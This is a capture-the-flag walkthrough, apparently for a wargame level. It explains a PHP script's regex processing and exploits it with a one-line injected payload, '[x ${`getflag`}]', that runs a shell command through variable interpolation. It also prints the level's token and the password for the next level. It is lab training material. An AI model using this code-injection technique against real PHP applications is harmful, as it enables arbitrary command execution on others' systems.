## PHP Script Explanation

The PHP script `level06.php` contains the following functions:

1. **Function `y($m)`**:
   - Replaces all occurrences of `.` with ` x ` and `@` with ` y` in the input string `$m`.
   - Returns the modified string.

2. **Function `x($y, $z)`**:
   - Reads the contents of the file specified by `$y`.
   - Processes the contents using regular expressions:
     - It executes the `y()` function for any command enclosed in `[x ...]`.
     - Replaces `[` with `(` and `]` with `)` in the contents.
   - Returns the processed string.

3. **Execution**:
   - The script takes command-line arguments and processes the specified file.
   - The output is printed to the terminal.

## Executing the Command

To exploit this script to execute the `getflag` command, follow these steps:

1. **Create the Input File**:
   - Create a file in `/tmp/` with the following content:
     ```bash
     echo '[x ${`getflag`}]' > /tmp/06
     ```

2. **Run the PHP Script**:
   - Execute the script using:
     ```bash
     /usr/bin/php level06.php /tmp/06
     ```

3. **Output**:
   - You may encounter a PHP notice due to the script's handling of the command. The expected output will display the flag, e.g.,:
     ```
     Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
     ```

4. **Enter Level 07**:

    ```bash
    su level07
    Password: wiok45aaoguiboiki2tuin6ub     
    ```
